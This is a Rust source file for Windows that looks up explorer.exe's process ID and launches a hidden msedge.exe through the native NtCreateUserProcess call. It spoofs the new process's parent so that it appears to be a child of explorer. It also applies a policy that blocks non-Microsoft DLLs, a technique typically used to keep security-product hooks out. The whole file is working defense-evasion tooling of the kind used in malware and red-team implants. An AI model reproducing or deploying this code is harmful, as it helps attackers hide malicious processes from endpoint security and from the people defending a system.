#![allow(non_snake_case, dead_code, unused_imports)]
use std::mem::size_of;
use std::ptr::null_mut;
use widestring::U16CString;
use winapi::ctypes::c_void;
use std::ffi::c_int;
use ntapi::{
    ntpsapi::{
        NtQueryInformationProcess, NtResumeThread, 
        PROCESS_BASIC_INFORMATION, ProcessBasicInformation,
        PS_ATTRIBUTE, PS_CREATE_INFO

    },
    ntrtl::{RtlCreateProcessParametersEx ,RtlDestroyProcessParameters}
};

use winapi::shared::{
    basetsd::{SIZE_T,ULONG_PTR},
    minwindef::{ULONG,DWORD},
    ntdef::{UNICODE_STRING, OBJECT_ATTRIBUTES, NTSTATUS},

};
use winapi::um::{
    handleapi::CloseHandle,
    winnt::{HANDLE, PROCESS_ALL_ACCESS}
};
use windows_sys::Win32::System::Diagnostics::ToolHelp::Process32First;
use windows_sys::Win32::System::Diagnostics::ToolHelp::PROCESSENTRY32;
use winapi::um::handleapi::INVALID_HANDLE_VALUE;
use windows_sys::Win32::System::Diagnostics::ToolHelp::TH32CS_SNAPPROCESS;
use windows_sys::Win32::System::Diagnostics::ToolHelp::CreateToolhelp32Snapshot;
use windows_sys::Win32::System::Diagnostics::ToolHelp::Process32Next;

extern "system" {
    fn NtCreateUserProcess(
        ProcessHandle: *mut HANDLE,
        ThreadHandle: *mut HANDLE,
        ProcessDesiredAccess: ULONG,
        ThreadDesiredAccess: ULONG,
        ProcessObjectAttributes: *mut OBJECT_ATTRIBUTES,
        ThreadObjectAttributes: *mut OBJECT_ATTRIBUTES,
        ProcessFlags: ULONG,
        ThreadFlags: ULONG,
        ProcessParameters: *mut c_void,
        CreateInfo: *mut PS_CREATE_INFO,
        AttributeList: *mut PS_ATTRIBUTE_LIST,
    ) -> NTSTATUS;
}

extern "system" {
    // Declaration for NtOpenProcess
    fn NtOpenProcess(
        ProcessHandle: *mut HANDLE,
        DesiredAccess: ULONG,
        ObjectAttributes: *mut OBJECT_ATTRIBUTES,
        ClientId: *mut CLIENT_ID
    ) -> NTSTATUS;
}

const PS_ATTRIBUTE_MITIGATION_OPTIONS_2: ULONG = 0x20010;
const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON: u64 = 0x10000000000;

#[repr(C)]
struct CLIENT_ID {
    UniqueProcess: HANDLE,
    UniqueThread: HANDLE,
}

#[repr(C)]
struct PS_ATTRIBUTE_LIST {
    TotalLength: SIZE_T,
    Attributes: [PS_ATTRIBUTE; 3],
}

const STARTF_USESHOWWINDOW: DWORD = 0x00000001;
const SW_HIDE: c_int = 0;

fn spawn_process(ppid:u64) {
    unsafe {
        let nt_image_path = U16CString::from_str("\\??\\C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe").unwrap();
        let current_directory = U16CString::from_str("\\??\\C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\117.0.2045.36").unwrap();
        let command_line = U16CString::from_str("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" ).unwrap();

        let mut nt_image_path_us = UNICODE_STRING {
            Length: (nt_image_path.len() * 2) as u16,
            MaximumLength: (nt_image_path.len() * 2) as u16,
            Buffer: nt_image_path.into_raw() as *mut _,
        };

        let mut current_directory_us = UNICODE_STRING {
            Length: (current_directory.len() * 2) as u16,
            MaximumLength: (current_directory.len() * 2) as u16,
            Buffer: current_directory.into_raw() as *mut _,
        };

        let mut command_line_us = UNICODE_STRING {
            Length: (command_line.len() * 2) as u16,
            MaximumLength: (command_line.len() * 2) as u16,
            Buffer: command_line.into_raw() as *mut _,
        };

        let mut process_parameters: *mut _ = std::ptr::null_mut();
        RtlCreateProcessParametersEx(
            &mut process_parameters,
            &mut nt_image_path_us as *mut _,
            std::ptr::null_mut(),
            &mut current_directory_us,
            &mut command_line_us,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0x01,
        );

        (*process_parameters).WindowFlags |= STARTF_USESHOWWINDOW;
        (*process_parameters).ShowWindowFlags = SW_HIDE as u32;

        // Obtain handle to parent (e.g., explorer.exe with PID 10104)
        let mut oa: OBJECT_ATTRIBUTES = std::mem::zeroed();
        let mut cid = CLIENT_ID {
            UniqueProcess: ppid as HANDLE, // Hardcoded PID for explorer.exe
            UniqueThread: null_mut(),
        };
        
        let mut hParent: HANDLE = null_mut();
        NtOpenProcess(&mut hParent, PROCESS_ALL_ACCESS, &mut oa, &mut cid);

        println!("[+] HANDLE: {:p}", hParent);
        // Adjust the PS_ATTRIBUTE_LIST to hold 3 attributes
        let mut attribute_list: PS_ATTRIBUTE_LIST = std::mem::zeroed();
        attribute_list.TotalLength = size_of::<PS_ATTRIBUTE_LIST>() as _;


        // Initialize the PS_CREATE_INFO structure
        let mut create_info: PS_CREATE_INFO = std::mem::zeroed();
        create_info.Size = size_of::<PS_CREATE_INFO>() as _;

        attribute_list.Attributes[0].Attribute = 0x20005; // PS_ATTRIBUTE_IMAGE_NAME 
        attribute_list.Attributes[0].Size = nt_image_path_us.Length as usize;
        attribute_list.Attributes[0].u.Value = nt_image_path_us.Buffer as usize;

        // BlockDLLs policy
        let policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
        attribute_list.Attributes[1].Attribute = 0x20010 as usize;
        attribute_list.Attributes[1].Size = size_of::<u64>() as usize;
        attribute_list.Attributes[1].u.ValuePtr = &policy as *const _ as *mut c_void;

        
        // Set Parent Process attribute
        attribute_list.Attributes[2].Attribute = 0x00060000;
        attribute_list.Attributes[2].Size = size_of::<HANDLE>() as usize;
        attribute_list.Attributes[2].u.ValuePtr = hParent; 
        


        let mut h: HANDLE = null_mut();
        let mut t: HANDLE = null_mut();
        let r2 = NtCreateUserProcess(
            &mut h, 
            &mut t, 
            (0x000F0000) |  (0x00100000) | 0xFFFF, //PROCESS_ALL_ACCESS
            (0x000F0000) |  (0x00100000) | 0xFFFF, //THREAD_ALL_ACCESS
            null_mut(), 
            null_mut(), 
            0x00000000, 
            0x0, 
            process_parameters as *mut _, 
            &mut create_info as *mut _, 
            &mut attribute_list as *mut _
        );

        let mut pbi: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
        let status = NtQueryInformationProcess(
            h, 
            ProcessBasicInformation, 
            &mut pbi as *mut _ as *mut c_void,
            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as ULONG,
            null_mut()
        );

        if status == 0 || r2 == 0 {
            println!("[+] PID: {}", pbi.UniqueProcessId as usize);

        } else {
             println!("NTSTATUS: {:x}", r2);
            println!("Error querying process info: {:?}", status);
        }
        // 11. Close the handle to the parent process.
        CloseHandle(hParent);
        // 12. Free any allocated memory.
        RtlDestroyProcessParameters(process_parameters);

    }

}

/// Gets the process ID by name, take process name as a parameter
fn get_process_id_by_name(process_name: &str) -> Result<u32, String> {
    let h_snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };

    if h_snapshot == INVALID_HANDLE_VALUE as isize {
        return Ok(Err("Failed to call CreateToolhelp32Snapshot").to_owned()?);
    }

    let mut process_entry: PROCESSENTRY32 = unsafe { std::mem::zeroed::<PROCESSENTRY32>() };
    process_entry.dwSize = size_of::<PROCESSENTRY32>() as u32;

    if unsafe { Process32First(h_snapshot, &mut process_entry) } == 0 {
        return Ok(Err("Failed to call Process32First").to_owned()?);
    }

    loop {
        if convert_c_array_to_rust_string(process_entry.szExeFile.to_vec()).to_lowercase()
            == process_name.to_lowercase()
        {
            break;
        }

        if unsafe { Process32Next(h_snapshot, &mut process_entry) } == 0 {
            return Ok(Err("Failed to call Process32Next").to_owned()?);
        }
    }

    return Ok(process_entry.th32ProcessID);
}


fn convert_c_array_to_rust_string(buffer: Vec<u8>) -> String {
    let mut rust_string: Vec<u8> = Vec::new();
    for char in buffer {
        if char == 0 {
            break;
        }
        rust_string.push(char as _);
    }
    String::from_utf8(rust_string).unwrap()
}

fn main() {
    let process = "explorer.exe";
    let ppid = get_process_id_by_name(&process).expect("Failed to get process ID");
    spawn_process(ppid.into());
}




